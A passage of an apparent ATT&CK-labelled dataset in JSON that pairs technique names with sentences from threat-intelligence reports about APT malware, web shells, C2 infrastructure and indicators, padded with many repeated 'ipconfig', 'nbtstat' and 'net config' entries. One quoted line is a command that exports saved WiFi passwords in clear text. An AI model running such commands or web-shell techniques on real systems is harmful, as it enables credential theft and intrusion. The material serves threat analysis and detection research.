    "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files."
  ],
  "system network configuration discovery": [
    "Neither this new domain nor the IP it resolves to have been observed in the past, indicating that the sample in Table 3 may be associated with a newer campaign",
    "Table 4: URL parameters Additionally, the command string is hashed using the same RGPH hashing algorithm as before",
    "Analysis of the domains and IP address infrastructure used by APT15 identified a number of similar possible domains, shown at the bottom of the post",
    "In one instance, a log file recovered from an open indexed server revealed that an IP address (112.66.188.28) located in Hainan, China had been used to administer the command and control node that was communicating with malware on victim machines",
    "APT40 used MURKYSHELL at a compromised victim organization to port scan IP addresses and conduct network enumeration",
    "In order to decide which domain xparis() holds, a variable pingadori() uses the radador() function to randomize the domain",
    "Instructions within guide.txt explaining how to carry out DNS hijacking attack In one part of guide.txt, an example target appears to be provided, with a corresponding adversary IP (185.162.235[.]106) for the legitimate domain to be redirected to",
    "By running SSH on the server in a compromised network, attackers can come back to the network whenever they want",
    "Note that IP addresses can be reallocated",
    "Backdoor.Pirpi also collects information about the target\u2019s local network, including the domain controller and workstations",
    "It also gathers network information such as the MAC address, IP address, WINS, DHCP server, and gateway",
    "Regular Expressions   ([^r-v\\\\s])[r-v]([\\\\w\\\\d+\\\\/=]+)-\\\\w+.(<domainList[0]>|<domainList[1]>|<domainList[n]>)   Address:\\\\s+(([a-fA-F0-9]{0,4}:{1,4}[\\\\w|:]+){1,8})   Address:\\\\s+(([a-fA-F0-9]{0,4}:{1,2}){1,8})   ([^r-v\\\\s]+)[r-v]([\\\\w\\\\d+\\\\/=]+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)   (\\\\w+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)   Address:\\\\s+(\\\\d+.\\\\d+.\\\\d+.\\\\d+)    Table 3 Regular expressions used by RogueRobin The C# variant, like its PowerShell relative, will issue DNS queries to determine which query types can successfully communicate with its C2 servers",
    "Examining historical IP resolutions revealed a common IP between the active nameservers, 107.175.75[.]123",
    "This IP is of particular interest as historical domain resolutions of this IP revealed that it had resolved to the domain hotmai1l[.]com in the past as well, which was a domain we had previously identified as having a high likelihood of association with DarkHydrus infrastructure",
    "This IP also belongs to the same service provider and class B network range as another IP we had associated with DarkHydrus, 107.175.150[.]113 which specifically resolved to a domain name containing a victim organization\u2019s name",
    "After the second DLL is loaded into memory, the first DLL overwrites the IP address for the control server, effectively changing the address the malware will communicate with",
    "DHS and FBI are distributing these IP addresses to enable network defense activities and reduce exposure to the DDoS command-and-control network",
    "FBI has high confidence that HIDDEN COBRA actors are using the IP addresses for further network exploitation.This alert includes technical indicators related to specific North Korean government cyber operations and provides suggested response actions to those indicators, recommended mitigation techniques, and information on reporting incidents to the U.S",
    "If Adobe Flash or Microsoft Silverlight is no longer required, DHS recommends that those applications be removed from systems.The IOCs provided with this alert include IP addresses determined to be part of the HIDDEN COBRA botnet infrastructure, identified as DeltaCharlie",
    "DHS and FBI recommend that network administrators review the IP addresses, file hashes, network signatures, and YARA rules provided, and add the IPs to their watchlist to determine whether malicious activity has been observed within their organization.When reviewing network perimeter logs for the IP addresses, organizations may find numerous instances of these IP addresses attempting to connect to their systems",
    "The IP address in the lateral movement techniques was substituted with the local machine IP address to achieve code execution on the system",
    "When we analyzed the email headers, we determined that the email was sent from an SMTP server using an IP associated with the Yonsei University network",
    "text=  from=  ai= ags=  oe= aq= btnG=  oprnd=  ai= utm=  channel=  The page address in the domain of the command and control server is chosen randomly from the list",
    "Analysis of their configurations show that the C2 servers used both fully-qualified domain names and IP addresses",
    "The Retriever Trojan uses the following namespace: using pcchekapp.grp.ammar.samaneh; Android.The malware begins by creating a web service object and uses the following URL within its configuration: http:// service.chrome-up[.]date:8080 /WebService.asmx It then calls a function called \u201cSetLog2\u201d, which sets variables for the system\u2019s IP address, MAC address and hostname",
    "The code will gather some information about the system, specifically the local IP address, MAC address, and the external IP address of the system",
    "Similar to Reaver as posted by Palo Alto, it gets the IP or domain of the C&C server, the port, name of the binary, a sleep timer, and what Palo Alto calls a \u201ccampaign identifier.\u201d Technical Details At this moment, we were unable to retrieve the original infection vector and other information regarding what other tools the APT15 group is using to attack their targets",
    "Victim system reconnaissance The code then tries to obtain the victim\u2019s public IP via \u201chttps://api.ipify.org/\u201d",
    "The public IP is then POSTed along with OS Version, Internal IP, Machine Name, Domain Name, UserName after being encrypted to the previously chosen URL to register a new victim",
    "If the first resolved domain IP address starts with 24.125.X.X, then it is set to 1",
    "It is unknown what these domains may have been used for but based on the similarity of domain spoofing and sharing an IP, they are likely part of the adversary infrastructure",
    "The email address is associated with the Lebanese domain of a major global financial institution",
    "Inspecting the class C network for 185.162.235.0/24 shows us that another IP on the same network resolves to an OilRig domain, msoffice-cdn[.]com which we identified in August 2017",
    "The malware then requests a connection to 192.184.60.229 on TCP port 81 using the command \"05 01 00 01 c0 b8 3c e5 00 51\" and verifies that the first two bytes from the server are \"05 00\" (c0 b8 3c e5 is the IP address and 00 51 is the port in network byte order)",
    "The chinapolicyanalysis.org domain was used as the sender address, as well as the hosting location of the malicious RTF document",
    "The mericcs.org domain was used as the sender address, as well as the hosting location of the malicious RTF document",
    "The structure of the domain mimics the Mercator Institute for China Studies (MERICS), whose actual domain is merics.org",
    "Network Indicators\u200b     Hostname IP Address Notes   mailcenter.support 221.121.138.139 Domain used to for sending spear phishes and user tracking",
    "chinapolicyanalysis.org 185.130.212.168 Domain used for spear phish sender e-mail address and to host malicious documents",
    "fprii.net 185.130.212.254 Domain used for spear phish sender e-mail address and to host malicious documents",
    "mericcs.org 221.121.138.141 Domain used for spear phish sender e-mail address and to host malicious documents",
    "In February 2018, several KHRAT associated domains began resolving to the IP address 89.46.222[.]97",
    "Examining passive DNS (pDNS) records from PassiveTotal revealed several domain names associated with this IP that mimic popular technology companies",
    "One of these domains, facebook-apps[.]com, was identified in one of the malware samples associated with this IP address",
    "The diagram in Figure 1 shows the samples, domains, IP addresses and e-mail addresses that we identified during our investigation (See Appendix B\u00a0for more detail on these.) There is a clear split between Cluster A and Cluster B, with no infrastructure overlap between the two",
    "RATANKBA looking for specific IP ranges Our analysis of samples of the hack tool (HKTL_NBTSCAN.GA and HKTL_NBTSCAN.GB) indicate it as a command-line program that scans IP networks for NetBIOS information such as IP address, NetBIOS computer name, logged-in username, and MAC address\u2014with some of the information coming from the initial RATAKNBA installation",
    "One of the first steps that several Mosquito installer packages performed after writing and running this local_update js file was to export all local host\u2019s WiFi profiles (settings and passwords) to %APPDATA%\\<profile>.xml with a command line call: cmd.exe /c netsh wlan export profile key=clear folder=\"%APPDATA%\" They then gather more network information with a call to ipconfig and arp -a",
    "Based on dynamic and static analysis of the malware sample associated with the supservermgr[.]com domain however, we were able to determine several unique artifacts which allowed us to expand our dataset and discover additional findings",
    "hxxp://www.sanjosemaristas[.]com/app/index.php?{A01BA0AD-9BB3-4F38-B76B-A00AD11CBAAA}, providing the current network adapter\u2019s service name GUID",
    "In Figure 9, below, red indicates targeted IP addresses, malware, registrant information, and domains associated with the targeted attack campaign while blue indicates criminal attack IP addresses, malware used, registrant information, and domains:  Figure 9",
    "(Source: Dell SecureWorks) As shown in Figure 10, the unpacked JavaScript code reveals an iframe pointing to an IP address that is hosting the exploit",
    "(Source: Dell SecureWorks) Appendix D \u2014 Domain name parking example CTU researchers have observed TG-3390 parking domains by pointing their A record to a non-routable IP space, including the 127.0.0.[x] loopback address",
    "The code will gather the information and format the list using the following HTML to create a table: <table> <tr><td>Type</td><td>Owner</td><td>Permissions</td><td>Created</td><td>Modificated</td><td>Size</td><td>Path</td></tr> <tr><td>[fileType]</td><td>[fileOwnerAccountName]</td><td>[number filePosixPermissions]</td><td>[fileCreationDate]</td><td>[fileModificationDate]</td><td>[fileSize]</td><td>[file path?]</td></tr> \u2026 </table>    Table 1 Commands available within XAgent OSX The \u2018showBackupIosFolder\u2019 command is rather interesting, as it allows the threat actors to determine if a compromised system was used to backup an IOS device, such as an iPhone or iPad",
    "Trickbot uses this encrypted module to scan the network and steal relevant network information.",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    "ipconfig ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " nbtstat ",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    " net config",
    "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).(Citation: US-CERT-TA18-106A)(Citation: Mandiant APT41 Global Intrusion )\n\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. "
  ],
  "server software component: web shell": [
    "It is a preferred platform within data centers and the cloud for businesses, as well as an ongoing favorite when it comes to a majority of Internet-facing web and application servers",
    "Furthermore, this group has routinely identified and exploited vulnerable web servers of targeted organizations to install web shells, such as ANTAK and ASPXSPY, and used stolen legitimate credentials to compromise externally facing Outlook Web Access (OWA) resources",
    "Attack Lifecycle  Initial Compromise APT40 has been observed leveraging a variety of techniques for initial compromise, including web server exploitation, phishing campaigns delivering publicly available and custom backdoors, and strategic web compromises",
    "APT40 relies heavily on web shells for an initial foothold into an organization",
    "Web shells are heavily relied on for nearly all stages of the attack lifecycle",
    "Internal web servers are often not configured with the same security controls as public-facing counterparts, making them more vulnerable to exploitation by APT40 and similarly sophisticated groups",
    "Maintain Presence APT40 primarily uses backdoors, including web shells, to maintain presence within a victim environment",
    "APT40 strongly favors web shells for maintaining presence, especially publicly available tools",
    "OwaAuth \u2014 This web shell and credential stealer deployed to Microsoft Exchange servers is installed as an ISAPI filter",
    "(Source: SecureWorks)  China Chopper web shell \u2014 This web-based executable script communicates with a full-featured user interface to allow threat actors to transfer and create files, open a command terminal, and interact with database servers",
    "(Source: SecureWorks) In multiple instances, CTU researchers observed artifacts from unsuccessful attempts to create a web shell on web-accessible JBOSS-based service desk software, followed by use of a functional shell to gain access to the environment",
    "(Source: SecureWorks) Reentry attempt After BRONZE UNION was evicted from a compromised environment, which involved blocking the group's known infrastructure, CTU researchers observed the group attempting to reconnect to its OWA web shells and a backup web shell it had deployed during the intrusion",
    "To report an intrusion and request resources for incident response or technical assistance, you are encouraged to contact DHS NCCIC (NCCICCustomerService@hq.dhs.gov or 888-282-0870), the FBI through a local field office, or the FBI\u2019s Cyber Division (CyWatch@fbi.gov or 855-292-3937).Protect Against SQL Injection and Other Attacks on Web ServicesTo protect against code injections and other attacks, system operators should routinely evaluate known and published vulnerabilities, periodically perform software updates and technology refreshes, and audit external-facing systems for known web application vulnerabilities",
    "They should also take the following steps to harden both web applications and the servers hosting them to reduce the risk of network intrusion via this vector.Use and configure available firewalls to block attacks.Take steps to secure Windows systems, such as installing and configuring Microsoft\u2019s Enhanced Mitigation Experience Toolkit (EMET) and Microsoft AppLocker.Monitor and remove any unauthorized code present in any www directories.Disable, discontinue, or disallow the use of Internet Control Message Protocol (ICMP) and Simple Network Management Protocol (SNMP) as much as possible.Remove unnecessary HTTP verbs from web servers",
    "Typical web servers and applications only require GET, POST, and HEAD.Where possible, minimize server fingerprinting by configuring web servers to avoid responding with banners identifying the server software and version number.Secure both the operating system and the application.Update and patch production servers regularly.Disable potentially harmful SQL-stored procedure calls.Sanitize and validate input to ensure that it is properly typed and does not contain escaped code.Consider using type-safe stored procedures and prepared statements.Audit transaction logs regularly for suspicious activity.Perform penetration testing on web services.Ensure error messages are generic and do not expose too much information.Permissions, Privileges, and Access ControlsSystem operators should take the following steps to limit permissions, privileges, and access controls.Reduce privileges to only those needed for a user\u2019s duties.Restrict users\u2019 ability (permissions) to install and run unwanted software applications, and apply the principle of \u201cLeast Privilege\u201d to all systems and services",
    "Additionally, on that same url, http://mdzz2019.noip[.]cn:3654/ is used to distribute more versions of this Gh0stRAT sample, along with a .zip file containing ASPXSpy, a web shell",
    "Audit ISAPI filters and search for web shells on Microsoft Exchange servers",
    "ChinaChopper web shell",
    "(Source: Dell SecureWorks) Passwords, like \"admin-na-google123!@#\" shown in Figure 4, are required to interact with the web shell",
    "TG-3390 has used additional web shells containing similarly formatted passwords",
    "However, the OwaAuth web shell password contains the victim organization's name",
    "More information about the OwaAuth web shell is available in Appendix C",
    "ASPXTool \u2014 A modified version of the ASPXSpy web shell (see Figure 6)",
    "ASPXTool web shell",
    "The OwaAuth web shell is likely created with a builder, given that the PE compile time of the binary does not change between instances and the configuration fields are padded to a specific size",
    "The adversaries modify publicly available tools such as ASPXSpy to remove identifying characteristics that network defenders use to identify web shells",
    "TG-3390 actors have deployed the OwaAuth web shell to Exchange servers, disguising it as an ISAPI filter",
    "They then identify the Exchange server and attempt to install the OwaAuth web shell",
    "If the OwaAuth web shell is ineffective because the victim uses two-factor authentication for webmail, the adversaries identify other externally accessible servers and deploy ChinaChopper web shells",
    "(Source: Dell SecureWorks) To facilitate lateral movement, the adversaries deploy ASPXTool web shells to internally accessible systems running IIS",
    "Mapping of TG-3390's interactions with web shells during an intrusion responded to by CTU researchers",
    "OwaAuth web shell PDB string",
    "Each web shell instance is configured to contain SP, Key, and Log variables",
    "OwaAuth web shell command set",
    "The stylecs.aspx webshell provides fairly significant functionality, as its developer wrote this webshell in JScript that ultimately runs any supplied JScript code provided to it within the HTTP request..",
    "Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.(Citation: volexity_0day_sophos_FW)\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013)"
  ],
  "application window discovery": [
    "The majority of businesses still maintain Windows-heavy user environments where certain core infrastructure components also operate under Windows servers (e.g., Active Directory, SharePoint, etc.)",
    "The MPK IRC Bot monitors active application windows and writes the title of the open window along with the logged keystrokes to a file at \u201c%temp%\\Save.tmp\u201d",
    "The MPK Trojan also monitors specifically for windows that are likely to contain login forms for popular web-based email clients, such as titles that contain: \u201cGmail -\u201d \u201cYahoo \u2013 login\u201d \u201cSign In -\u201d \u201cOutlook.com -\u201c MPK will attempt to parse these window titles to identify the associated email address and record these to the log file using the following format: ///////////// Mail Find <email address> /////////// If the Trojan does not find the window titles associated with Gmail, Yahoo or Outlook, it saves the title to the \u201cSave.tmp\u201d file in the following format: +++++++++++++ Window= <window title> +++++++++++++ The major difference between the IRC variant and non-IRC variant of MPK is the C2 protocol used",
    "Because of Poseidon\u2019s longevity, there are samples targeting Windows systems as early as Windows NT 4.0 Server and Windows 95 Workstation up to current versions like Windows 8.1, as well as server variants (very important to them, given the emphasis on reaching Domain Controllers in corporate environments.) How is this different from any other targeted attack? The extortion elements of this campaign are what set it apart from others",
    "Offset Description   0x0 Victim GUID (8C8CEED9-4326-448B-919E-249EEC0238A3)   0x25 Victim IP Address (192.168.180.154)   0x45 Command (0x66660001)   0x49 Length of payload (0x2f \u2013 47)   0x4d Field 1 \u2013 Windows major version (0x6 \u2013 Windows Vista+)   0x51 Field 2 \u2013 Windows minor version (0x1 \u2013 Windows 7)   0x55 Field 3 \u2013 Unknown (0x20)   0x59 Payload (default flag:4/2/2018 1:01:33 AM)    Table 5 \u2013 Beacon structure for PLAINTEE",
    "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.(Citation: Prevailion DarkWatchman 2021)"
  ],
  "indicator removal on host: file deletion": [
    "Linux malware detection and prevention is not prevalent at this time, but Palo Alto Networks customers are protected through our next-generation security platform:  IPS signature 14917 deployed to identify and prevent command and control activity The C2 domains and files mentioned in this report are blocked in our Threat Prevention product",
    "Destroy Evidence: Securely deleted logs, as well as deployed and executed disk-wiping malware, to cover tracks and disrupt forensic analysis",
    "The organization managed to discover what scripts were hosted on the server before BE/SandWorm gang deleted them, and\u00a0unfortunately couldn\u2019t restore them after they were deleted",
    "For example, at the end of 2016 CTU researchers observed the threat actors using native system functionality to disable logging processes and delete logs within a network",
    "After running within the %TEMP% path, Comnie will delete the original file",
    "KEYS Deletes the file named by tempPath + \u201cky\u201d file so as not to upload anything",
    "LANS Deletes the file created by the LAN command to reverse the effect",
    "USBS Deletes the file created by the USB command to reverse the effect",
    "HDS Deletes the file created by the HD command to reverse the effect",
    "DEL-TEMP Deletes all files in the \u201cAppData/Local/Temp\u201d path",
    "Overwrite a file with all zeros and mark it for deletion on reboot  Wiping files with zeros and marking it for deletion on reboot.\u00a0  Delete files using the DeleteFile() API Load an arbitrary library into its process space",
    "The SHAPESHIFT malware is capable of wiping disks, erasing volumes and deleting files, depending on its configuration",
    "Appendix Malware Family Descriptions    Malware Family  Description  Availability    DROPSHOT  Dropper that has been observed dropping and launching the TURNEDUP backdoor, as well as the SHAPESHIFT wiper malware  Non-Public    NANOCORE  Publicly available remote access Trojan (RAT) available for purchase",
    "DEL Deletes a specified file",
    "The message sent to the C2 will be \u201cfile is deleted.\u201d if successful or \u201cfile is not deleted.\u201d if unsuccessful",
    "Deletes existing file",
    "The dropped executable (MD5: 78734CD268E5C9AB4184E1BBE21A6EB9) contains the compressed FELIXROOT dropper component in the Portable Executable (PE) binary overlay section",
    "The dropper will delete itself at the end of the process",
    "After this file is copied, the original \u2018Update.~tmp\u2019 file is deleted",
    "In the event it does, Reaver will move this file to \u2018%TEMP%\\~FJIOW.tmp\u2019 and delete this new file",
    "boom! Deletes GID.bin, ShwDoc.VBS and ShwDoc.srv files, as well as the scheduled task whose name a GUID stored in the GID.bin file",
    "Also, the x command will delete the generated registry key and the Office365DCOMCheck/SystemDiskClean scheduled task",
    "After running the malware, the batch script goes on to cleans up all signs of its existence on the system, this includes:  Deletion of all initial files created during installation, as well as all associated files required on disk during initial execution",
    "Kaspersky Lab products detect the malware used by Poseidon Group with the following detection names: Backdoor.Win32.Nhopro HEUR:Backdoor.Win32.Nhopro.gen HEUR:Hacktool.Win32.Nhopro.gen How many victims have you found? At least 35 victim companies have been identified with primary targets including financial and government institutions, telecommunications, manufacturing, energy and other service utility companies, as well as media and public relations firms",
    "This system configuration file (in.sys) will drop a backdoor installer (UserInstall.exe) then delete itself",
    "Both \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.txt\u201d and \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.exe\u201d are then deleted",
    "Once they are deleted by the attackers\u2019 code, there is nothing left to be forensically recovered.",
    "and then deletes the original launcher",
    "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.(Citation: Microsoft SDelete July 2016) Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS."
  ],
  "standard application layer protocol new service web service exfiltration over command and control channel fallback channels-multi": {
    "technique_names": [
      "application layer protocol",
      "create or modify system process",
      "web service",
      "exfiltration over c2 channel",
      "fallback channels"
    ],
    "sentances": [
      "Indicators    Type Value   MD5 364ff454dcf00420cff13a57bcb78467   SHA256 8bca0031f3b691421cb15f9c6e71ce193 355d2d8cf2b190438b6962761d0c6bb   ssdeep 3072:n+1R4tREtGN4qyGCXdHPYK9l 0H786O26BmMAwyWMn/qwwiHNl:n +1R43QcILXdF0w6IBmMAwwCwwi   MD5 075b6695ab63f36af65f7ffd45cccd39   SHA-256 02c7cf55fd5c5809ce2dce56085ba437 95f2480423a4256537bfdfda0df85592   ssdeep 3072:9ZAxHANuat3WWFY9nqjwbuZf 454UNqRpROIDLHaSeWb3LGmPTrI W33HxIajF:9ZAxHANJAvbuZf454UN +rv eQLZPTrV3Z   MD5 e107c5c84ded6cd9391aede7f04d64c8   SHA-256 fd8b2ea9a2e8a67e4cb3904b49c789d 57ed9b1ce5bebfe54fe3d98214d6a0f61   ssdeep 6144:W/D5tpLWtr91gmaVy+mdckn6 BCUdc4mLc2B9:4D5Lqgkcj+   Path /bin/rsyncd   Path Desc synchronize and backup service   Path ~/.config/dbus-notifier/dbus-inotifier   Path Desc system service d-bus notifier   Path /bin/ksysdefd   Path ~/.config/ksysdef/ksysdefd   Path Desc system kernel service defender   C2 azureon-line[.]com   C2 198.105.125[.]74   C2 mozilla-plugins[.]com   C2 Mozillaplagins[.]com"
    ]
  },
  "system information discovery": [
    "Size Expansion of Configuration Information PlugX is designed to run based on its configuration information stored in itself",
    "This version of the campaign made malicious use of unins000.exe, a process that belongs to the Brazilian information security company GAS Tecnologia, to gather personal information undetected",
    "The autonomous system name of the IP shows that the allocation is controlled by Serverius Holding B.V., which is an autonomous system name we have previously seen associated with the OilRig group",
    "OSinfo: OSInfo is a general purpose, system information gathering tool",
    "This backdoor collects system information, including the operating system version and hostname, and includes functionality to check, upload, and register plugins that can further enhance its capabilities",
    "The data above contains the hostname (\u2018HOSTNAME-PC\u2019) of the victim machine, as well as an instruction",
    "To obtain a job, the Trojan builds a subdomain that has the following structure and issues a DNS query to the C2 server: c<unique identifier><job identifier padded with \u20180\u2019 to make three digits><sequence number>c The generated subdomain is then subjected to a number-to-character substitution function that is the inverse of the Table 4, which effectively converts all the digits in the subdomain into characters",
    "Once the second DLL is executed, it gathers information about the victim system\u2019s setup, such as operating system version, and driver and processor information",
    "System owners are also advised to run the YARA tool on any system they suspect to have been targeted by HIDDEN COBRA actors",
    "One computer that was infected with both Cadelspy and Remexi was a system that ran a SIM card editing application",
    "Cadelspy initially arrives on the computer as a dropper, which downloads two installer components catering to whether the victim is running a 32-bit or 64-bit system",
    "Other functionalities provided by this section of the PowerShell Script are as follows:  Retrieves the following data from the system by leveraging Windows Management Instrumentation (WMI) queries and environment variables: IP Address from Network Adapter Configuration OS Name OS Architecture Computer Name Computer Domain Name Username    All of this data is concatenated and formatted as shown in Figure 13:    Figure 13: Concatenated and formatted data retrieved by PowerShell script  Register the victim\u2019s machine to the C2 server by sending the REGISTER command to the server",
    "Freenki is used to gather information about the infected system and to download a subsequent stage payload",
    "The information this malware collected included the following:The computer nameThe usernameThe execution path of the sampleThe BIOS modelA randomly-generated ID to uniquely identify the systemGroup123 utilized this method to ensure their victim was (a) someone they wanted to target further and (b) someone they could infect further based on the information obtained from the reconnaissance phase",
    "You can see that in addition to the code, the author copy-pasted English typos such as \"IE Registery\":PDB PathsWe can clearly identify a pattern in the PDB naming convention of all the binaries mentioned in this article.ROKRAT:e:\\Happy\\Work\\Source\\version 12\\T+M\\Result\\DocPrint.pdb (from the \"Evil New Year\" campaign)d:\\HighSchool\\version 13\\2ndBD\\T+M\\T+M\\Result\\DocPrint.pdb (from the \"North Korean Human Rights\" campaignD:\\HighSchool\\version 13\\First-Dragon(VS2015)\\Sample\\Release\\DogCall.pdb (ROKRAT Sample from an unidentified campaign from June)Wiper:D:\\HighSchool\\version 13\\VC2008(Version15)\\T+M\\T+M\\TMProject\\Release\\ErasePartition.pdb (From the \"Are You Happy?\" campaign)Summary GraphHere is a graph to visualize the similarities and differences between each campaign mentioned in this article:ConclusionSouth Korea is becoming an important target for malicious actors and the techniques used are becoming specific to the region (for example: use of native language to try and ensure the targets feel that the information, document or email being sent to them has added legitimacy)",
    "After connecting to the IRC server, the MPK bot sends custom ping messages and provides an introduction via a \u201c!Hello\u201d message that contains the current logged in user of the infected host, if the user has administrator privileges, the hostname, the UUID of the system, and operating system version",
    "The malware queries the Windows API to get the computer name, user name, volume serial number, Windows version, processor architecture and two additional values, which are \u201c1.3\u201d and \u201cKdfrJKN\u201d",
    "Parameter   Description    \u2018u=\u2019  This parameter contains target machine information in the following format: <Computer Name>, <User Name>, <Windows Versions>, <Processor Architecture>, <1.3>, < KdfrJKN >, <Volume Serial Number>    \u2018&h=\u2019  This parameter includes the information about the command executed and its results",
    "The rest of MirageFox functions similarly to previous malware created by APT15, first collecting information about the computer like the username, CPU information, architecture, and so forth",
    "infoClient is reponsible for collecting OS info, submitting this info to its C&C servers (the servers are malicious in nature), and receiving additional C&C communication information",
    "The HandlePP::getClientID method uses the following environment variables:   Figure 11.\u00a0Serial number   Figure 12.\u00a0Hardware UUID   Figure 13.\u00a0MAC address   Figure 14.\u00a0Randomly generated UUID For the initial information packet, the backdoor also collects the following:   Figure 15.\u00a0OS version Running getpwuid ->pw_name , scutil \u2013 -get ComputerName, and uname \u2013m will provide the following returns respectively:  Mac OSX 10.12",
    "As we can see, the following information is present within this configuration:  Remote Command and Control (C2) server Remote port Sleep timer  Reaver continues to collect various information from the victim machine, including the following:  CPU speed Computer name Username IP Address Microsoft Windows version Physical and virtual memory information  The malware proceeds to communicate with the remote server via HTTP GET and POST requests",
    "Reaver continues to collect various information from the victim machine, including the following:  Computer name Volume serial number Microsoft Windows version CPU speed ANSI code page OEM code page identifier for the operating system Physical and virtual memory information  Reaver encrypts this data using an incremental XOR key and uploads it to the configured remote server on the port specified",
    "Here is an example of the result of ps\u00a0ax on an infected system:       $ ps ax[...] 566 ?? Ss 0:00.01 /usr/libexec/icloudsyncd -launchd netlogon.bundle[...]     Figure 8: Result of ps ax on an infected system Keychain stealing The OSX/Keydnap backdoor is equipped with a mechanism to gather and exfiltrate passwords and keys stored in OS X\u2019s keychain",
    "POST /api/osx/started HTTP/1.1Host: r2elajikcosf7zee.onion.toAccept: */*Content-Length: 233Content-Type: application/x-www-form-urlencodedbot_id=9a8965ba04e72909f36c8d16aa801794c6d905d045c2b704e8f0a9bbb97d3eb8&amp;data=psX0DKYB0u...5TximyY%2BQY%3D     Figure 10: Malware sending initial information       &gt; rc4decrypt(base64decode(\"psX0DKYB0u...5TximyY+QY=\"), \"u2RLhh+!LGd9p8!ZtuKcN\")device_model=MacBookPro9,2bot_version=1.3.5build_name=elitef*ckos_version=15.5.0ip_address=4.5.6.7has_root=0     Figure 11: Decoded data sent to C&C The bot_id is constructed by hashing the following values with SHA-256:  The hardware UUID (IOPlatformUUID) The system serial number (IOPlatformSerialNumber) The model identifier of the Mac (e.g.:\u00a0MacBookPro9,2)  Most actions are self-explanatory",
    "Additional information For more information about the attacks and the indicators of compromise, please contact: intelreports@kaspersky.com Alternatively, please visit: https://www.kaspersky.com/enterprise-security/apt-intelligence-reporting To find more information about cybersecurity awareness training for enterprise or government staff, go to Kaspersky Security Awareness",
    "This information allows a threat actor to determine if their messages were delivered, which users are more susceptible to opening them, and basic information regarding the target\u2019s operating system and e-mail client (or browser)",
    "This phase will often leverage a specialized tool that automatically collects a wide array of information including credentials, group management policies, and even system logs to better hone further attacks and assure execution of their malware",
